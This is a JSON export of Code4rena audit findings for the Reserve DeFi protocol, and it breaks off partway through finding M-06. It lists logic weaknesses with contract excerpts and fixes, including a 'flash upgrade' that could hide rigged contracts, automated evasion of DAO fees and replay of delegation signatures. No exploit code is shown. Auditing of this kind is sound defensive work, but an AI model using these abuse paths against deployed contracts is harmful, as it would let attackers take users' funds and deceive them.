{
  "category": "Privacy",
  "total_findings": 591,
  "fetched_at": "2026-01-29T13:00:21Z",
  "findings": [
    {
      "id": "41030",
      "title": "[L-14] Distribution validation is inconsistent due to inclusion of variable DAO fee",
      "impact": "LOW",
      "content": "\nThe `Distributor._ensureSufficientTotal()` function is called with the return values of `totals()`, which includes the DAO fee in its calculations. This can lead to a situation where previously valid distributions become invalid if the DAO fee is lowered, as the sum of `rTokenTotal` and `rsrTotal` may fall below `MAX_DISTRIBUTION`.\n\nTo ensure consistent behavior regardless of DAO fee changes, `_ensureSufficientTotal()` should only consider the sum of `rTokenDist` and `rsrDist` values from the actual distributions, excluding the DAO fee.\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/34#issuecomment-2313749813):**\n > L-01 suggestion is great, honorable mention.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41029",
      "title": "[L-13] Issuance premium calculation may be inaccurate for view functions",
      "impact": "LOW",
      "content": "\nThe `issuancePremium()` function in `BasketHandler` assumes that `refresh()` has been called on the collateral token in the current block. If this assumption is not met, it returns `FIX_ONE` instead of calculating the actual premium. While this is generally not an issue because the protocol holds this invariant, it can lead to inaccurate results when called from external view functions that cannot trigger a `refresh()`, such as `RTokenAsset.price()`.\n\nTo improve accuracy and consistency, consider modifying `issuancePremium()` to calculate the premium regardless of when `refresh()` was last called. This would ensure more accurate premium values are returned even when accessed through view functions or external calls.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41028",
      "title": "[L-12] Changing distributions between revenue split and distribution can affect DAO fee amounts",
      "impact": "LOW",
      "content": "\nBuilding upon the issue identified in TRST-L-2 of the Trust Security audit report for v4.0.0, there are additional impacts related to changing distributions between when revenue is split in the `BackingManager` and when it's distributed in the `Distributor`:\n\n1. If RToken governance alters the distribution to heavily favor `rsrTotal` over `rTokenTotal`, they can significantly reduce the effective DAO fee for that cycle.\n2. If the DAO changes the fee percentage during this period, the RToken might end up paying more or less than would be fair for that cycle. This is very likely to happen to one RToken or the other whenever veRSR governance changes the fee.\n\nThese issues, like the one identified in TRST-L-2, are temporary and limited to single distribution cycles. The first case could be repeated and even automated to continuously evade paying the appropriate DAO fee.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41027",
      "title": "[L-11] Potential DAO fee rounding to zero for upgraded RTokens",
      "impact": "LOW",
      "content": "\nUpgraded RTokens might not pay DAO fees even if `daoFeeRegistry` has been set in `Main`. This is due to the change in the distribution total constraint in the `_ensureSufficientTotal()` function.\n\nIn previous versions, the check only required one of `rTokenDist` or `rsrDist` to be non-zero. The current implementation requires their sum to be greater than or equal to `MAX_DISTRIBUTION`. RTokens initialized with small distribution values in previous versions might not meet this new constraint after upgrading.\n\nFor small `rTokenTotal` and `rsrTotal` values, the [DAO fee calculation](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/Distributor.sol#L221-L223)in the `distribute()` function will round down to 0.\n\nConsider implementing a post-upgrade call to `_ensureSufficientTotal()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41026",
      "title": "[L-10] `StRSRVotes.delegateBySig()` misses check for delegation to happen in the era intended by the signer",
      "impact": "LOW",
      "content": "\n### Links to affected code\n\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/StRSRVotes.sol#L176\n\n### Description\n\nThe `StRSRVotes.delegateBySig()` function allows a signer to delegate voting power to a designed delegate via a gasless call.\n\nIf we look at the logic that verifies the signature verification:\n\n```Solidity\nFile: StRSRVotes.sol\n166:     function delegateBySig(\n167:         address delegatee,\n168:         uint256 nonce,\n169:         uint256 expiry,\n170:         uint8 v,\n171:         bytes32 r,\n172:         bytes32 s\n173:     ) public {\n174:         require(block.timestamp <= expiry, \"signature expired\");\n175:         address signer = ECDSAUpgradeable.recover(\n176:             _hashTypedDataV4(keccak256(abi.encode(_DELEGATE_TYPEHASH, delegatee, nonce, expiry))),\n177:             v,\n178:             r,\n179:             s\n180:         );\n181:         require(nonce == _useDelegationNonce(signer), \"invalid nonce\");\n182:         _delegate(signer, delegatee);\n183:     }\n```\n\nWe can see that the `era` is missing from the signed payload at L176.\n\nThis means that a delegation signature can be reused across era changes, despite balances and voting power no longer apply.\n\nConsider adding an `era` field to the signed payload for `StRSRVotes.delegateBySig()`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41025",
      "title": "[L-09] Missing check to avoid circular dependencies among RTokens",
      "impact": "LOW",
      "content": "\n### Links to affected code\n\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/BasketHandler.sol#L166\n\n### Description\n\nWhen BasketHandler switches basket to new reference amounts, it calls `trackStatus()`:\n\n```Solidity\nFile: BasketHandler.sol\n158:     function refreshBasket() external {\n159:         assetRegistry.refresh();\n160: \n161:         require(\n162:             main.hasRole(OWNER, _msgSender()) ||\n163:                 (lastStatus == CollateralStatus.DISABLED && !main.tradingPausedOrFrozen()),\n164:             \"basket unrefreshable\"\n165:         );\n166:         _switchBasket();\n167: \n168:         trackStatus();\n169:     }\n```\n\nThis call sequence would not call the scenario when there is a circular dependency between RTokens, for example: \n- RTokenA has RTokenB as collateral\n- RTokenB governance is is unaware of their token being a collateral in RTokenA\n- RTokenB adds RTokenA as collateral\n\nAt this point, price retrieval of either collateral would fail because of an infinite recursion.<br>\nWhile the RTokenB governance action can be seen as a mistake, RTokenA is affected too without any mistake made by its governance.\n\nConsider adding a `price()` call after `trackStatus()` to trigger a failure in the above-mentioned case.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41024",
      "title": "[L-08] `DutchTrade.bidWithCallback()` does not send back excess tokens",
      "impact": "LOW",
      "content": "\n### Links to affected code\n\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/plugins/trading/DutchTrade.sol#L260\n\n### Description\n\n`DutchTrade.bidWithCallback` allows for bidding with a callback hook that allows the bidder to swap the bought tokens for the sold tokens.\n\nAfter the callback exits, the function checks that enough tokens are provided:\n\n```Solidity\nFile: DutchTrade.sol\n257:         uint256 balanceBefore = buy.balanceOf(address(this)); // {qBuyTok}\n258:         IDutchTradeCallee(bidder).dutchTradeCallback(address(buy), amountIn, data);\n259:         require(\n260:             amountIn <= buy.balanceOf(address(this)) - balanceBefore,\n261:             \"insufficient buy tokens\"\n262:         );\n```\n\nHowever, if extra tokens are given, the function does not return the extras to the caller. Consider adding a check to return extra tokens if any are provided\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41023",
      "title": "[L-07] `VersionRegistry.latestVersion()` does not support semantic versioning",
      "impact": "LOW",
      "content": "\n### Links to affected code\n\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/registry/VersionRegistry.sol#L54\n\n### Description\n\nFrom the [version history of the Reserve protocol](https://github.com/reserve-protocol/protocol/tags) it appears that the protocol is using semantic versioning or a similar alternative.\n\nThis seems a use case that does not fit well with how `VersionRegistry.latestVersion` is updated: every time a new version is registered on `VersionRegistry`,  `latestVersion` will point to that version.\n\nIn the event that the protocol releases `4.0.0` and shortly after `3.4.2`, then `latestVersion` will incorrectly point to `3.4.2`.\n\nConsider adding a `boolean` flag to the `registerVersion` function, allowing the caller to specify whether `latestVersion` should be updated or not.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41022",
      "title": "[L-06] `PermitLib` uses two different ERC1271 implementations for the same call",
      "impact": "LOW",
      "content": "\n### Links to affected code\n\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/libraries/Permit.sol#L17\n\n### Description\n\nPermitLib offers the `requireSignature` function, which calls `isValidSignature` if `owner` is a contract, and uses OZ's `isValidSignatureNow` otherwise.\n\nIf we look at [the `isValidSignatureNow` implementation of the imported OZ version](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/2d081f24cac1a867f6f73d512f2022e1fa987854/contracts/utils/cryptography/SignatureCheckerUpgradeable.sol#L28), however, we can see that this, too, has a fallback call to `IERC1271.isValidSignature`.\n\nThe `if isContract` branch in `requireSignature` is therefore useless because it's redundant with the other, more standard, branch and we therefore recommend removing it.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41021",
      "title": "[L-05] Broker accepts `batchAuctionLength` and `dutchAuctionLength` to be both `0`",
      "impact": "LOW",
      "content": "\n### Links to affected code\n\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/Broker.sol#L199<br>\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/Broker.sol#L221\n\n### Description\n\nWhen `Broker` is initialized, and later re-configured via `governance` calls, it validates the `batchAuctionLength` and `dutchAuctionLength` given parameters individually:\n\n```Solidity\nFile: Broker.sol\n073:     function init(\n---\n080:     ) external initializer {\n---\n101:         setBatchAuctionLength(batchAuctionLength_);\n102:         setDutchAuctionLength(dutchAuctionLength_);\n103:     }\n---\n197:     function setBatchAuctionLength(uint48 newAuctionLength) public governance {\n198:         require(\n199:             newAuctionLength == 0 ||\n200:                 (newAuctionLength >= MIN_AUCTION_LENGTH && newAuctionLength <= MAX_AUCTION_LENGTH),\n201:             \"invalid batchAuctionLength\"\n202:         );\n203:         emit BatchAuctionLengthSet(batchAuctionLength, newAuctionLength);\n204:         batchAuctionLength = newAuctionLength;\n205:     }\n---\n219:     function setDutchAuctionLength(uint48 newAuctionLength) public governance {\n220:         require(\n221:             newAuctionLength == 0 ||\n222:                 (newAuctionLength >= MIN_AUCTION_LENGTH && newAuctionLength <= MAX_AUCTION_LENGTH),\n223:             \"invalid dutchAuctionLength\"\n224:         );\n225:         emit DutchAuctionLengthSet(dutchAuctionLength, newAuctionLength);\n226:         dutchAuctionLength = newAuctionLength;\n227:     }\n```\n\nIt does however not validate the situation when they are both provided as `0`. This is a situation that is not admissible because in this case, no auction can be created and a BasketManager can't open recollateralization trades.\n\nConsider adding additional checks in `setBatchAuctionLength` and `setDutchAuctionLength` to prevent setting both to `0`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41020",
      "title": "[L-04] RToken issuance/redemption throttles can be monopolized by Bundlers and Batchers",
      "impact": "LOW",
      "content": "\n### Links to affected code\n\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/RToken.sol#L121-L122<br>\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/RToken.sol#L199-L200<br>\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/RToken.sol#L277-L278<br>\n\n### Description\n\nWhen the RToken issuance and redemption are close to their limits, every upcoming issuance and redemption creates opportunity for a new operation in opposite direction to happen in the form of restored amount available for redemption or issuance respectively.\n\nThis means that actors that can control the ordering of transactions, and/or when a transaction is executed, like MEV bundlers and gasless transaction batchers, will have the upper hand on using these available amounts, potentially monopolizing them for themselves.\n\nWe don't have a suggested mitigation for the contracts in the scope, but we'd rather issue a recommendation for users to use private mempools and avoid gasless transactions for operations involving RToken issuance and redemption.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41019",
      "title": "[L-03] Prime basket weights are not properly validated",
      "impact": "LOW",
      "content": "\n### Links to affected code\n\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/BasketHandler.sol#L264\n\n### Description\n\nWhen the Governance sets the prime basket compositions, for each of the provided collaterals, it is allowed to specify any target amount between `1` and `MAX_TARGET_AMT` (L264):\n```Solidity\nFile: BasketHandler.sol\n260:         for (uint256 i = 0; i < erc20s.length; ++i) {\n261:             // This is a nice catch to have, but in general it is possible for\n262:             // an ERC20 in the prime basket to have its asset unregistered.\n263:             require(assetRegistry.toAsset(erc20s[i]).isCollateral(), \"erc20 is not collateral\");\n264:             require(0 < targetAmts[i] && targetAmts[i] <= MAX_TARGET_AMT, \"invalid target amount\");\n265: \n266:             config.erc20s.push(erc20s[i]);\n267:             config.targetAmts[erc20s[i]] = targetAmts[i];\n268:             names[i] = assetRegistry.toColl(erc20s[i]).targetName();\n269:             config.targetNames[erc20s[i]] = names[i];\n270:         }\n```\n\nThis check is however insufficient because excessively low values of `targetAmt`, like `1`, would likely cause overflows in the code that translates balances to assets / baskets like the BasketHandler.basketsHeldBy function.\n\nConsider enforcing the [range specified in the acceptable values for prime basket weights](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/docs/solidity-style.md?plain=1#L105), at the very least by requiring `targetAmts` to be `1e-6 (D18)` or more instead of the `1e-18 (D18)` or more that is currently allowed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41018",
      "title": "[L-02] \"Flash\" upgrade can be abused to create rigged but honest-looking RToken contracts",
      "impact": "LOW",
      "content": "\n### Links to affected code\n\nhttps://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/Main.sol#L111-L150\n\n### Description\n\nThe Main contract offers the possibility to upgrade Main and Component implementations, fetching the target addresses from an external `versionRegistry` provider.\n\nBecause the Deployer doesn't set `versionRegistry` but let the contract admin provide it, and this entity can't always be trusted as it's specified in the permissionless `Deployer.deploy` function, the contract upgrade system can be abused to achieve a large variety of deviations from its intended behavior by:\n- setting custom implementations\n- tampering with the storage of all contracts (including balances and/or settings to bypass `init` sanity checks)\n- restoring the contracts in a state that looks legitimate with proper implementations and governance\n\nAll of the above can be achieved in one single transaction (hence the \"Flash upgrade\" term used above), possibly to be bundled with the contract creation or buried in a long list of spammy interactions to lower the chances of detection; after a moderately sophisticated attack like [the one presented in PoC](https://gist.github.com/3docSec/1cf7037b38f72719326f0f59d3f787f2) there can be no signs of past wrongdoing in the result of any of the RToken contracts' getters.\n\nConsider having the Deployer set `Main.versionRegistry` at RToken deployment time to enforce continued use of trusted code.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41017",
      "title": "[L-01] Asymmetric decay of Asset saved priced distorts average price",
      "impact": "LOW",
      "content": "\n### Links to affected code\n\nhttps://github.com/code-423n4/2024-07-reserve/blob/main/contracts/plugins/assets/Asset.sol#L150-L163\n\n### Description\n\nThe Asset contract implements a graceful fallback for being able to provide underlying asset prices when the upstream oracle is unreachable.\n\nThis fallback uses the last known price, but artificially widens its range (`low-high`) to offset the uncertainty over the stale price.\n\nThe math of how this offset is done is implemented with this code;\n```Solidity\nFile: Asset.sol\n150:                 // Decay _high upwards to 3x savedHighPrice\n151:                 // {UoA/tok} = {UoA/tok} * {1}\n152:                 _high = savedHighPrice.safeMul(\n153:                     FIX_ONE + MAX_HIGH_PRICE_BUFFER.muluDivu(delta - decayDelay, priceTimeout),\n154:                     ROUND\n155:                 ); // during overflow should not revert\n156: \n157:                 // if _high is FIX_MAX, leave at UNPRICED\n158:                 if (_high != FIX_MAX) {\n159:                     // Decay _low downwards from savedLowPrice to 0\n160:                     // {UoA/tok} = {UoA/tok} * {1}\n161:                     _low = savedLowPrice.muluDivu(decayDelay + priceTimeout - delta, priceTimeout);\n162:                     // during overflow should revert since a FIX_MAX _low breaks everything\n163:                 }\n```\n\nWe can see that when the decay starts (`delta == decayDelay`), the saved `high/low` readings are returned unchanged; then they start diverging linearly: at the end of the decay (left limit of `delta == decayDelay + priceTimeout`) `low` reaches `0` and `high` is scaled up by a multiplier of `FIX_ONE + MAX_HIGH_PRICE_BUFFER`, that is 3x its cached value.\n\nReferring to [this chart](https://github-production-user-asset-6210df.s3.amazonaws.com/145972240/357833152-d4a42618-e03c-4f9b-ae95-61bb77bbd224.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240911%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240911T223748Z&X-Amz-Expires=300&X-Amz-Signature=71d369476874c7a35ef010db4a8a0c486a4f6ceba2e246eeeeb8862cea6c1382&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=0), because the two values - `low` (blue)  and `high` (red) - diverge with a different slope, their average (`(low + high) / 2`, green) also varies over time and increases.\n\nWhile this is not an issue for the Asset itself which doesn't directly combine the two values with an average, it can be for downstream contracts that may do.\n\nConsider changing `MAX_HIGH_PRICE_BUFFER` to `FIX_ONE` instead.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "41016",
      "title": "[M-07] The `tradeEnd` in `BackingManager` isn't updating correctly",
      "impact": "MEDIUM",
      "content": "\n### Lines of code\n\n<https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/BackingManager.sol#L114><br>\n<https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/BackingManager.sol#L166>\n\n### Impact\n\nIn the `BackingManager`, we use the `tradeEnd` value for each type of `trade` to prevent next `auction` from occurring within the same block. We can find a comment in the code explaining this in `line 114`.\n\n    function rebalance(TradeKind kind) external nonReentrant {\n        // DoS prevention:\n    114:    // unless caller is self, require that the next auction is not in same block\n        require(\n            _msgSender() == address(this) || tradeEnd[kind] < block.timestamp,\n            \"already rebalancing\"\n        );\n\nThis approach works correctly for `Batch auctions`. However, with `Dutch auctions`, the `tradeEnd` value can inadvertently block the next `auction` from starting for a certain period.\n\n### Proof of Concept\n\nThe `maximum auction length` can be up to `1 week`.\n\n    uint48 public constant MAX_AUCTION_LENGTH = 60 * 60 * 24 * 7; // {s} max valid duration, 1 week\n\nAnd the `minimum warm-up period` in the `BasketHandler` is `1 minute`.\n\n    uint48 public constant MIN_WARMUP_PERIOD = 60; // {s} 1 minute\n\nSuppose a `Dutch auction` is created in the `BackingManager` with a length of `1 week` (`7 days`), starting at timestamp `T`. The `tradeEnd` for this `auction type` is set to `T + 7 days` in `line 166`.\n\n    function rebalance(TradeKind kind) external nonReentrant {\n    155:    if (doTrade) {\n\n    165:\t    ITrade trade = tryTrade(kind, req, prices);\n    166:\t    tradeEnd[kind] = trade.endTime(); // {s}\n\n    168:\t}\n    }\n\nNow, let's consider a scenario where one of the `assets` in the `basket` temporarily falls into an `IFFY` status. At this point, the current status of the `basket` is also `IFFY` (`line 323~325`).\n\n    function status() public view returns (CollateralStatus status_) {\n    \tuint256 size = basket.erc20s.length;\n        if (disabled || size == 0) return CollateralStatus.DISABLED;\n        \n        for (uint256 i = 0; i < size; ++i) {\n            CollateralStatus s = assetRegistry.toColl(basket.erc20s[i]).status();\n    323:        if (s.worseThan(status_)) {\n    324:            if (s == CollateralStatus.DISABLED) return CollateralStatus.DISABLED;\n    325:            status_ = s;\n            }\n        }\n    }\n\nThe `auction` is settled one day later, triggering the `rebalance` function (`line 92`).\n\n    function settleTrade(IERC20 sell) public override(ITrading, TradingP1) returns (ITrade trade) {\n        delete tokensOut[sell];\n        trade = super.settleTrade(sell); // nonReentrant\n\n        if (_msgSender() == address(trade)) {        \n    92:        try this.rebalance(trade.KIND()) {} catch (bytes memory errData) {\n            }\n        }\n    }\n\nThe check at `line 116` passes because the caller is the `BackingManager` itself. However, the `BasketHandler` status is still `IFFY`, meaning it isn't ready for a new `auction`. As a result, the check at `line 121` prevents the next `auction` from being created.\n\n    function rebalance(TradeKind kind) external nonReentrant {\n        requireNotTradingPausedOrFrozen();\n        assetRegistry.refresh();\n\n        require(\n    116:        _msgSender() == address(this) || tradeEnd[kind] < block.timestamp,\n            \"already rebalancing\"\n        );\n\n        require(tradesOpen == 0, \"trade open\");\n        \n    121:    require(basketHandler.isReady(), \"basket not ready\");\n        \n        require(block.timestamp >= basketHandler.timestamp() + tradingDelay, \"trading delayed\");\n    }\n\nThe `tradeEnd` is still set to `T + 7 days` and the current time is now `T + 1 day`.\n\nAfter another day, the `asset`'s status recovers to `SOUND`, and the `BasketHandler` status updates to `SOUND` as well.<br>\nAfter the `warm-up period` (`1 minute` in our scenario), the `BasketHandler` is ready, and the time is now `T + 2 days + 1 minute`.<br>\nAt this point, we want to create a new `Dutch auction` for `rebalancing`.<br>\nHowever, we can't create the next `Dutch auction` until `T + 7 days` due to the existing `tradeEnd`.\n\nThis delay clearly poses an issue.\n\n### Recommended Mitigation Steps\n\n```\n    function settleTrade(IERC20 sell) public override(ITrading, TradingP1) returns (ITrade trade) {\n            delete tokensOut[sell];\n            trade = super.settleTrade(sell); // nonReentrant\n\n            if (_msgSender() == address(trade)) {\n                try this.rebalance(trade.KIND()) {} catch (bytes memory errData) {\n                    if (errData.length == 0) revert(); // solhint-disable-line reason-string\n                }\n\n    +\t\t\ttradeEnd[kind] = uint48(block.timestamp);\n\n            }\n        }\n    }\n```\n\n**[akshatmittal (Reserve) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/6#issuecomment-2310820950):**\n > We'd like to bump this down to Low.\n> \n> This is an issue, although does not impact protocol availability. The protocol can still function as expected using the other trading methods.\n\n**[cccz (judge) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/6#issuecomment-2317945795):**\n > After reconsidering the issue, I think this should be valid Medium. It indeed affects the availability of the protocol, which meets the Medium severity.\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/6#issuecomment-2319485561):**\n > The issue can only impact DutchTrade because it is the only KIND that can have auctions that end before the endTime. \n> \n> I only see the availability of the protocol being impacted if the GnosisTrade' `reportViolation()` triggers, which would ultimately be the real cause of the loss of availability. GnosisTrade is supposed to be the fallback mechanism for trading. \n> \n> Possibly relevant: the notions of disabling in the Broker are very different for dutch trade and batch trade:\n> - in dutch trades it is intended to detect if the protocol is trading off bad pricing data, since a dutch trade necessarily involves an assumption about the highest possible price. This is possible to trigger intentionally by burning \\$. \n> - in batch trades it is intended to detect if EasyAuction goes beyond the worst-case min buy amounts. Similar to if a Uniswap swap violated slippage constraints, it should not happen. This should not be possible to trigger intentionally by burning \\$.\n\n**[ether\\_sky (warden) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/6#issuecomment-2319567307):**\n > Thanks for your reveiw.\n> \n> There are only two types of `trades`.<br>\n> Because of this issue, `Dutch auctions` cannot occur for up to one week.<br>\n> In some cases, `Dutch auctions` could be more efficient than `Batch trades`, but we are required to use `Batch trades` instead.\n> \n> Additionally, as the sponsor described, `Batch trades` can be paused due to `reportViolation()`.<br>\n> In such cases, this issue could have a significant impact.\n> \n> Therefore, I believe this issue deserves a Medium severity based on its impact and likelihood.\n\n**[cccz (judge) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/6#issuecomment-2321463045):**\n > Yes, as warden said, Dutch auctions being unavailable for a period of time is a concern.\n\n**[akshatmittal (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/6#issuecomment-2321503978):**\n > @cccz - Let me clarify what @tbrent is trying to say.\n> \n> Batch Auctions are always available, and the whole reason they exist is for scenarios like this. The key about `reportViolation` for Gnosis Trade is that it checks for an EasyAuction protocol invariant, and nothing else. That is why it's the \"backup\" trading method.\n> \n> Dutch Auctions and Batch Auctions have different characteristics from a what-happens-when perspective, but similar characteristics from a competition and pricing perspective. Yes, Dutch Auctions make it more efficient for the participants, which is why it exists, but it's not something that the protocol entirely depends on.\n> \n> Unavailability of Dutch Auction _does_ not mean the protocol is at risk or is \"unavailable\", which is why we disable Dutch Auctions in many more conditions than Batch Auctions. Keep in mind that early versions of the protocol did not even have Dutch Trade to begin with.\n> \n> That said, we'll leave it to you to decide here, we are internally considering it a low severity issue.\n\n**[ether\\_sky (warden) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/6#issuecomment-2321527000):**\n > Hi @akshatmittal - thanks for your comment.\n> \n> I understood all your points. However, how can auditors know whether the `Dutch Auctions` is not important? The only thing which we could find is that there are only 2 types of auctions and one of them can be unavailable for some periods and each auctions can be paused due to `reportViolation` functionality.\n> \n> Anyway, I will respect judge's decision.\n> \n> Thanks again.\n\n**[Reserve mitigated](https://github.com/code-423n4/2024-09-reserve-mitigation?tab=readme-ov-file#findings-being-mitigated)**\n\n**Status:** Mitigation confirmed. Full details in reports from [RadiantLabs](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/17), [ether_sky](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/29) and [Bauchibred](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/7).\n\n***\n\n",
      "summary": "\nThis bug report is about an issue found in the `BackingManager` code of a project called `Reserve`. The `BackingManager` uses a value called `tradeEnd` to prevent auctions from happening in the same block. This works fine for one type of auction, but for another type, it can cause delays in starting a new auction. This delay can last up to a week and can have a significant impact on the project. The report suggests a possible solution and the severity of the issue is debated among the project team and auditors. Ultimately, the issue is considered to be of medium severity and the project team confirms that they will mitigate the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "https://github.com/code-423n4/2024-07-reserve-findings/issues/6",
      "tags": [],
      "finders": [
        "stuart\\_the\\_minion",
        "RadiantLabs",
        "ether\\_sky"
      ]
    },
    {
      "id": "41015",
      "title": "[M-06] The time available for a canceled withdrawal should not impact future unstaking processes",
      "impact": "MEDIUM",
      "content": "\n### Lines of Code\n\n<https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/StRSR.sol#L279><br>\n<https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/StRSR.sol#L658><br>\n<https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/StRSR.sol#L368>\n\n### Impact\n\nWhen `stakers` want to `unstake` their `StRSR`, they cannot `withdraw` `RSR` immediately.<br>\nInstead, each `withdrawal` enters a `queue` and will become available after the `unstaking delay` period.<br>\nThis `queue` operates on a `FIFO` basis, meaning earlier `withdrawals` are processed before later ones.<br>\n`Stakers` can also cancel their `withdrawals`, and the `RSR` will be `restaked` immediately.<br>\nHowever, even canceled `withdrawals` can still impact future `withdrawal` requests.\n\n### Proof of Concept\n\nSuppose the current `unstakingDelay` is set to `1 day`, and a user decides to `unstake` some amount of `StRSR` at time `T` (`line 279`).\n\n    function unstake(uint256 stakeAmount) external {\n        address account = _msgSender();\n        